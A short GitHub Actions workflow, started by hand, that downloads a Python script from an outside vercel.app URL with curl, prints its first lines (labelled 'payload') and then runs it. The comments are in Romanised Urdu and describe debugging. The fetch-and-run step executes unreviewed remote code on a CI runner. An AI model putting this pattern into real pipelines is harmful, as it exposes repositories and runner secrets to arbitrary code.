name: test

on:
  workflow_dispatch:

jobs:
  debug-script:
    runs-on: ubuntu-latest
    
    steps:
      - name: Initialize Python Environment
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Let see
        run: curl -sL https://mys-ecru.vercel.app/test.py -o test.py

      - name: Diagnostic Phase 1 (File Integrity Check)
        # Ye check kare ga ke download hui file Python he ya HTML error page
        run: |
          echo "=== FILE SIZE ==="
          ls -lh test.py
          echo "=== FIRST 10 LINES OF PAYLOAD ==="
          cat test.py | head -n 10

      - name: Hmm
        # Yahan hum ne /dev/null hata diya he taake asli error console me dikhe
        run: python test.py
